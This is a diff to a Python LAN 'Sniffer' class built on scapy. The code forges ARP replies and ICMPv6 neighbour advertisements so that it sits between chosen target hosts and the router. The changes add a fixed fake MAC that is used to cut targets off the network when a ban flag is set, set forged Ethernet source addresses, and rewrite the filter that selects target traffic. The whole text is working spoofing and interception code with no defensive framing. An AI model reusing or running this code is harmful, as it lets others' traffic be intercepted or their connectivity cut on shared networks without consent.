@@ -13,14 +13,19 @@ from monitor import attack
 
 
 class Sniffer:
-    def __init__(self, iface: str):
+    def __init__(self, iface: str = conf.iface):
         """
         LAN Network sniffer using ARP spoofing
         :param iface: LAN interface
         :param spoof_interval: interval of ARP message
         """
         self.started = False
-        self.iface = iface
+
+        try:
+            self.iface = iface.name
+        except:
+            self.iface = iface
+
         try:  # Windows platform
             from scapy.arch import ifaces
             addr = netifaces.ifaddresses(ifaces.dev_from_name(iface).guid)
@@ -58,7 +63,7 @@ class Sniffer:
         print("Router MAC          : %s" % self.router_mac)
 
         self.sniffer = None
-        self.block_target = False
+        self.respoof_mac = "3E:11:4F:B0:D3:62"
 
     def scan(self, timeout=3) -> dict:
         """
@@ -176,17 +181,17 @@ class Sniffer:
         ARP and ICMPv6 spoof router
         """
         while self.started:
-            mac = 'aa:bb:cc:dd:ee:ff' if attack.ban else self.mac
+            mac = self.respoof_mac if attack.arp_ban else self.mac  # just a random unexisting mac
             # ARP spoofing
             for target_ip in self.target_ip:
                 for router_ip in self.router_ip:
-                    p = l2.Ether(dst=self.router_mac) / \
+                    p = l2.Ether(src=mac, dst=self.router_mac) / \
                         l2.ARP(op=2, psrc=target_ip, pdst=router_ip, hwsrc=mac)
                     sendp(p, verbose=False, iface=self.iface)
             # ICMPv6 neighbour spoofing
             for target_ip6 in self.target_ip6:
                 for router_ip6 in self.router_ip6:
-                    p = l2.Ether(dst=self.router_mac) / \
+                    p = l2.Ether(src=mac, dst=self.router_mac) / \
                         inet6.IPv6(src=target_ip6, dst=router_ip6) / \
                         inet6.ICMPv6ND_NA(tgt=target_ip6, R=0) / \
                         inet6.ICMPv6NDOptDstLLAddr(lladdr=mac)
@@ -219,10 +224,11 @@ class Sniffer:
         Filter packets to make sure we only process our target's packet
         :param p: packet to be determined
         """
-        if p.haslayer(inet.IP):
+        if p[l2.Ether].type == 2048:
             return p[inet.IP].src in self.target_ip or p[inet.IP].dst in self.target_ip
-        elif p.haslayer(inet6.IPv6):
+        elif p[l2.Ether].type == 34525:
             return not p.haslayer(inet6.ICMPv6ND_NA) and (
-                    p[inet6.IPv6].src in self.target_ip6 or p[inet6.IPv6].dst in self.target_ip6)
+                    p[inet6.IPv6].src not in self.ip6 | self.router_ip6 or p[
+                inet6.IPv6].dst not in self.ip6 | self.router_ip6)
         else:
             return False
